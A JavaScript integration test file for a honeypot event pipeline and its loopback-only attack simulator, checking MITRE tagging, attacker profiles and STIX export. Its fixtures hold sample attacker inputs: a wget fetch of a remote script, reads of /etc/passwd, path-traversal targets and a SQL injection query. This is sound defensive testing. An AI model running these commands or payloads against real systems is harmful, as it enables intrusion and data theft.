import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { loadConfig } from "../../../packages/shared/src/config.js";
import { createEvent } from "../../../packages/shared/src/event.js";
import { createLogger } from "../../../packages/shared/src/logger.js";
import { createProcessor } from "../src/processor.js";
import { buildFeatureSummary } from "../../../packages/profile/src/llm-classify.js";
import { sanitizeDoc } from "../../api/src/sanitize.js";
import { createServer } from "../../api/src/server.js";
import {
  SCENARIO_NAMES,
  buildRequestList,
  displayRequest,
  formatDryRun,
  formatSummary,
  parseArgs,
  resolveScenario,
  validateTarget,
} from "../../../tools/attack-simulator.js";

const silentLogger = createLogger({ level: "silent" });
const silent = { info: () => {}, warn: () => {}, error: () => {} };
const IP = "127.0.0.1";
const BASE = Date.parse("2026-10-29T10:00:00.000Z");

function stamp(seconds) {
  return new Date(BASE + seconds * 1000).toISOString();
}

function tempDir() {
  return mkdtempSync(join(tmpdir(), "honeypot-day17-"));
}

function makeEvent(overrides = {}) {
  return createEvent({
    honeypot: { service: "ssh", nodeId: "node-01" },
    sessionId: "int-session",
    source: { ip: IP, port: 1234 },
    eventType: "connection_open",
    payload: {},
    ...overrides,
  });
}

function fakeIndexer() {
  const docs = [];
  return {
    docs,
    async index(input) {
      docs.push(...input);
      return { rejected: [], retries: 0, remaining: [] };
    },
    async close() {},
  };
}

function fakeSink() {
  const messages = [];
  return {
    messages,
    emit(event) {
      messages.push(event);
      return true;
    },
  };
}

function toMessages(events) {
  return events.map((event, i) => ({ value: Buffer.from(JSON.stringify(event), "utf8"), offset: String(i), topic: "honeypot.events", partition: 0 }));
}

async function runPipeline(events) {
  const dir = tempDir();
  const config = loadConfig({ BIND_HOST: IP, NODE_ID: "node-01", EVENT_DIR: dir, PROCESSOR_DEAD_LETTER_FILE: join(dir, "dead.jsonl") });
  const indexer = fakeIndexer();
  const sink = fakeSink();
  for (const event of events) sink.emit(event);
  const processor = createProcessor({ config, logger: silentLogger, geoip: { lookup: async () => null }, indexer });
  const result = await processor.processBatch(toMessages(sink.messages));
  await processor.close();
  return { result, indexer, sink };
}

function sshSession(sessionId, commands, startSecond = 0) {
  const events = [
    makeEvent({ sessionId, eventType: "connection_open", timestamp: stamp(startSecond), payload: {} }),
    makeEvent({ sessionId, eventType: "auth_attempt", timestamp: stamp(startSecond + 1), payload: { username: "admin", success: true } }),
  ];
  commands.forEach((command, i) => {
    events.push(makeEvent({ sessionId, eventType: "command", timestamp: stamp(startSecond + 2 + i), payload: { command, cwd: "/home/admin" } }));
  });
  events.push(makeEvent({ sessionId, eventType: "connection_close", timestamp: stamp(startSecond + 2 + commands.length), payload: { reason: "closed" } }));
  return events;
}

function ftpSession(sessionId, startSecond = 0) {
  const events = [
    makeEvent({ honeypot: { service: "ftp", nodeId: "node-01" }, sessionId, eventType: "connection_open", timestamp: stamp(startSecond), payload: {} }),
    makeEvent({ honeypot: { service: "ftp", nodeId: "node-01" }, sessionId, eventType: "auth_attempt", timestamp: stamp(startSecond + 1), payload: { username: "anonymous", success: true } }),
    makeEvent({ honeypot: { service: "ftp", nodeId: "node-01" }, sessionId, eventType: "ftp_command", timestamp: stamp(startSecond + 2), payload: { verb: "LIST", arg: "/", loggedIn: true, user: "anonymous", responseCode: 226 } }),
    makeEvent({ honeypot: { service: "ftp", nodeId: "node-01" }, sessionId, eventType: "ftp_command", timestamp: stamp(startSecond + 3), payload: { verb: "LIST", arg: "/backup", loggedIn: true, user: "anonymous", responseCode: 226 } }),
    makeEvent({ honeypot: { service: "ftp", nodeId: "node-01" }, sessionId, eventType: "connection_close", timestamp: stamp(startSecond + 4), payload: { reason: "closed" } }),
  ];
  return events;
}

function httpRequest(sessionId, payload, second) {
  return makeEvent({ honeypot: { service: "http", nodeId: "node-01" }, sessionId, eventType: "http_request", timestamp: stamp(second), payload });
}

function httpClose(sessionId, second) {
  return makeEvent({ honeypot: { service: "http", nodeId: "node-01" }, sessionId, eventType: "connection_close", timestamp: stamp(second), payload: { reason: "closed" } });
}

function eventDocs(result) {
  return result.docs.filter((doc) => doc.index.startsWith("honeypot-events-")).map((doc) => doc.body);
}

function sessionDocs(result) {
  return result.docs.filter((doc) => doc.index === "honeypot-sessions").map((doc) => doc.body);
}

function indexedDocs(indexer, index) {
  return indexer.docs.filter((doc) => doc.index === index).map((doc) => doc.body);
}

function mitreIds(doc) {
  return (doc.mitre || []).map((item) => item.techniqueId);
}

test("integration: basic-ssh flows to session, T1033, beginner recon profile", async () => {
  const events = sshSession("int-basic-ssh", ["whoami", "ls", "pwd", "exit"]);
  const { result, indexer, sink } = await runPipeline(events);
  assert.equal(sink.messages.length, events.length);
  assert.equal(result.stats.profilesWritten, 1);
  const whoami = eventDocs(result).find((doc) => doc.payload && doc.payload.command === "whoami");
  assert.ok(whoami);
  assert.ok(mitreIds(whoami).includes("T1033"));
  const sessions = sessionDocs(result);
  assert.equal(sessions.length, 1);
  assert.equal(sessions[0].closed, true);
  assert.equal(sessions[0].service, "ssh");
  const profiles = indexedDocs(indexer, "honeypot-profiles");
  assert.equal(profiles.length, 1);
  assert.equal(profiles[0].classification.skillLevel, "beginner");
  assert.equal(profiles[0].classification.intent, "recon");
});

test("integration: advanced-ssh wget flows to T1105, wget intermediate exploitation profile, contain attacker", async () => {
  const events = [
    ...sshSession("int-advanced-ssh", ["whoami", "cat /etc/passwd", "ps", "wget http://example.com/x.sh", "exit"]),
    ...ftpSession("int-ftp-merge", 20),
  ];
  const { result, indexer } = await runPipeline(events);
  const wget = eventDocs(result).find((doc) => doc.payload && doc.payload.command === "wget http://example.com/x.sh");
  assert.ok(wget);
  assert.ok(mitreIds(wget).includes("T1105"));
  const profiles = indexedDocs(indexer, "honeypot-profiles");
  const sshProfile = profiles.find((profile) => profile.sessionId === "int-advanced-ssh");
  assert.ok(sshProfile);
  assert.ok(sshProfile.classification.tools.includes("wget"));
  assert.equal(sshProfile.classification.skillLevel, "intermediate");
  assert.equal(sshProfile.classification.intent, "exploitation");
  const attackers = indexedDocs(indexer, "honeypot-attackers");
  const attacker = attackers[attackers.length - 1];
  assert.equal(attacker.strategy.name, "contain");
  assert.equal(attacker.strategy.crossService, true);
  assert.equal(attacker.serviceCount, 2);
});

test("integration: ftp-list flows to session and profile with no exfiltration intent", async () => {
  const events = ftpSession("int-ftp-list");
  const { result, indexer } = await runPipeline(events);
  const sessions = sessionDocs(result);
  assert.equal(sessions.length, 1);
  assert.equal(sessions[0].service, "ftp");
  assert.equal(sessions[0].ftpCommandCount, 2);
  const profiles = indexedDocs(indexer, "honeypot-profiles");
  assert.equal(profiles.length, 1);
  assert.notEqual(profiles[0].classification.intent, "exfiltration");
  assert.equal(eventDocs(result).some((doc) => doc.eventType === "file_transfer"), false);
});

test("integration: http-traversal flows to T1190 with rawTarget preserved but never sent to LLM or API output", async () => {
  const sessionId = "int-http-traversal";
  const events = [
    httpRequest(sessionId, { method: "GET", path: "/etc/passwd", rawTarget: "/../../etc/passwd", query: "", headers: {}, bodyPreview: "", matchedRoute: "not_found", responseStatus: 404 }, 0),
    httpRequest(sessionId, { method: "GET", path: "/etc/passwd", rawTarget: "/%2e%2e%2f%2e%2e%2fetc%2fpasswd", query: "", headers: {}, bodyPreview: "", matchedRoute: "not_found", responseStatus: 404 }, 1),
    httpRequest(sessionId, { method: "GET", path: "/search", rawTarget: "/search", query: "%27%20UNION%20SELECT%201%2C2--", headers: {}, bodyPreview: "", matchedRoute: "not_found", responseStatus: 200 }, 2),
    httpClose(sessionId, 3),
  ];
  const { result } = await runPipeline(events);
  const docs = eventDocs(result).filter((doc) => doc.eventType === "http_request");
  assert.equal(docs.length, 3);
  assert.equal(docs[0].payload.rawTarget, "/../../etc/passwd");
  assert.ok(mitreIds(docs[0]).includes("T1190"));
  assert.ok(docs.every((doc) => mitreIds(doc).length > 0));
  const summary = buildFeatureSummary({ commandNames: [], mitreTechniqueIds: mitreIds(docs[0]), mitreTactics: [], eventCount: 4, commandCount: 0, authAttempts: 0, authSuccess: 0, durationMs: 0, userAgents: [], totalTypingMs: 0, totalKeystrokes: 0, backspaceCount: 0 });
  const summaryText = JSON.stringify(summary);
  assert.equal(summaryText.includes("rawTarget"), false);
  assert.equal(summaryText.includes("../../etc/passwd"), false);
  const sanitized = sanitizeDoc(docs[0]);
  assert.equal("rawTarget" in sanitized.payload, false);
});

test("integration: http-login POST flows to T1190 while plain GET wp-login flows to no technique", async () => {
  const post = [
    httpRequest("int-http-post", { method: "POST", path: "/wp-login.php", query: "", headers: {}, bodyPreview: "log=admin&action=login", matchedRoute: "wp_login", responseStatus: 302 }, 0),
    httpClose("int-http-post", 1),
  ];
  const get = [
    httpRequest("int-http-get", { method: "GET", path: "/wp-login.php", query: "", headers: {}, bodyPreview: "", matchedRoute: "wp_login", responseStatus: 200 }, 0),
    httpClose("int-http-get", 1),
  ];
  const { result } = await runPipeline([...post, ...get]);
  const docs = eventDocs(result).filter((doc) => doc.eventType === "http_request");
  const postDoc = docs.find((doc) => doc.sessionId === "int-http-post");
  const getDoc = docs.find((doc) => doc.sessionId === "int-http-get");
  assert.ok(mitreIds(postDoc).includes("T1190"));
  assert.deepEqual(mitreIds(getDoc), []);
});

test("integration: mixed advanced-ssh plus ftp flows to one attacker with serviceCount 2 and sessionCount 2", async () => {
  const events = [
    ...sshSession("int-mixed-ssh", ["whoami", "cat /etc/passwd", "ps", "wget http://example.com/x.sh", "exit"]),
    ...ftpSession("int-mixed-ftp", 20),
  ];
  const { indexer } = await runPipeline(events);
  const attackers = indexedDocs(indexer, "honeypot-attackers");
  const attacker = attackers[attackers.length - 1];
  assert.equal(attacker.attackerId, IP);
  assert.equal(attacker.serviceCount, 2);
  assert.deepEqual(attacker.services, ["ftp", "ssh"]);
  assert.equal(attacker.strategy.crossService, true);
  assert.equal(attacker.strategy.name, "contain");
  assert.equal(attacker.sessionCount, 2);
  assert.equal(attacker.sessionIds.length, 2);
});

test("integration: STIX bundle from mixed integration contains identity, attack-patterns, observed-data, no invented technique", async () => {
  const events = [
    ...sshSession("int-stix-ssh", ["whoami", "cat /etc/passwd", "ps", "wget http://example.com/x.sh", "exit"]),
    ...ftpSession("int-stix-ftp", 20),
  ];
  const { result, indexer } = await runPipeline(events);
  const attackers = indexedDocs(indexer, "honeypot-attackers");
  const attacker = attackers[attackers.length - 1];
  const sessions = sessionDocs(result);
  const allowed = new Set(["T1033", "T1057", "T1082", "T1083", "T1087", "T1003", "T1552.001", "T1016", "T1046", "T1105", "T1027", "T1547", "T1190", "T1110.001", "T1078"]);
  const es = {
    info: async () => ({}),
    get: async () => ({ found: true, _id: IP, _source: attacker }),
    search: async (params) => {
      if ((params.index || "").includes("sessions")) {
        return { hits: { total: { value: sessions.length }, hits: sessions.map((session) => ({ _id: session.sessionId, _source: session })) } };
      }
      return { hits: { total: { value: 0 }, hits: [] } };
    },
  };
  const server = createServer({ es, logger: silent, config: { ES_INDEX_PREFIX: "honeypot", API_POLL_MS: 60000 } });
  await new Promise((resolve) => server.listen(0, IP, resolve));
  try {
    const port = server.address().port;
    const response = await fetch(`http://${IP}:${port}/api/attackers/${IP}/stix`);
    assert.equal(response.status, 200);
    const bundle = await response.json();
    assert.equal(bundle.type, "bundle");
    assert.equal(bundle.spec_version, "2.1");
    const identities = bundle.objects.filter((object) => object.type === "identity");
    assert.equal(identities.length, 1);
    const patterns = bundle.objects.filter((object) => object.type === "attack-pattern");
    assert.ok(patterns.length > 0);
    assert.ok(patterns.every((pattern) => allowed.has(pattern.name)));
    assert.ok(patterns.some((pattern) => pattern.name === "T1105"));
    const observed = bundle.objects.filter((object) => object.type === "observed-data");
    assert.equal(observed.length, 2);
    assert.ok(observed.every((object) => Array.isArray(object.object_refs) && object.object_refs.length === 0));
  } finally {
    await new Promise((resolve) => server.closeApi(resolve));
  }
});

test("simulator: allowlist rejects non-loopback host, non-honeypot port, and hostname", () => {
  assert.throws(() => validateTarget("8.8.8.8", 2222));
  assert.throws(() => validateTarget("127.0.0.1", 9999));
  assert.throws(() => validateTarget("example.com", 2222));
  assert.throws(() => validateTarget("localhost", 2222));
  validateTarget("127.0.0.1", 2222);
  validateTarget("127.0.0.1", 8080);
  validateTarget("127.0.0.1", 2121);
});

test("simulator: dry-run prints exact advanced-ssh request list in order", () => {
  const requests = buildRequestList("advanced-ssh", 1);
  const output = formatDryRun("advanced-ssh", requests);
  assert.equal(output, [
    "dry-run: advanced-ssh",
    "ssh: whoami",
    "ssh: cat",
    "ssh: ps",
    "ssh: wget http://example.com/x.sh",
    "ssh: exit",
    "requests: 5",
  ].join("\n"));
});

test("simulator: mixed scenario order is basic-ssh, then ftp-list, then http-login", () => {
  const requests = buildRequestList("mixed", 1);
  assert.deepEqual(requests.map((request) => request.protocol), ["ssh", "ssh", "ssh", "ssh", "ftp", "ftp", "http", "http"]);
  assert.deepEqual(requests.map((request) => displayRequest(request)), [
    "ssh: whoami",
    "ssh: ls",
    "ssh: pwd",
    "ssh: exit",
    "ftp: LIST /",
    "ftp: LIST /backup",
    "http: GET /wp-login.php",
    "http: POST /wp-login.php",
  ]);
});

test("simulator: list prints only the six scenario names", () => {
  assert.deepEqual(SCENARIO_NAMES, ["basic-ssh", "advanced-ssh", "ftp-list", "http-login", "http-traversal", "mixed"]);
});

test("simulator: request lists are deterministic", () => {
  assert.deepEqual(buildRequestList("mixed", 2), buildRequestList("mixed", 2));
  assert.deepEqual(buildRequestList("advanced-ssh", 2), buildRequestList("advanced-ssh", 2));
  assert.equal(buildRequestList("http-traversal", 1).length, 3);
});

test("simulator: output summary lists scenario, count, host, ports, counts, types, and no secret", () => {
  const requests = buildRequestList("advanced-ssh", 1);
  const summary = formatSummary({ scenario: "advanced-ssh", count: 1, host: IP, requests, sent: 5, failed: 0 });
  assert.ok(summary.includes("scenario: advanced-ssh"));
  assert.ok(summary.includes("count: 1"));
  assert.ok(summary.includes("host: 127.0.0.1"));
  assert.ok(summary.includes("ports: 2222"));
  assert.ok(summary.includes("requests sent: 5"));
  assert.ok(summary.includes("requests failed: 0"));
  assert.ok(summary.includes("ssh: wget http://example.com/x.sh"));
  assert.equal(summary.includes("password"), false);
  assert.equal(summary.includes("token"), false);
});

test("simulator: count repeats the scenario in order", () => {
  const requests = buildRequestList("basic-ssh", 3);
  assert.equal(requests.length, 12);
  assert.deepEqual(requests.map((request) => request.display), [
    "whoami", "ls", "pwd", "exit",
    "whoami", "ls", "pwd", "exit",
    "whoami", "ls", "pwd", "exit",
  ]);
});

test("simulator: unknown scenario, bad count, and unknown argument are rejected", () => {
  assert.throws(() => buildRequestList("nope", 1));
  assert.throws(() => parseArgs(["--scenario", "basic-ssh", "--count", "0"]));
  assert.throws(() => parseArgs(["--bogus"]));
  assert.equal(resolveScenario("basic"), "basic-ssh");
});

test("simulator: ftp-list contains listing only, never RETR", () => {
  const requests = buildRequestList("ftp-list", 1);
  assert.deepEqual(requests.map((request) => request.verb), ["LIST", "LIST"]);
  assert.equal(requests.some((request) => request.verb === "RETR"), false);
});
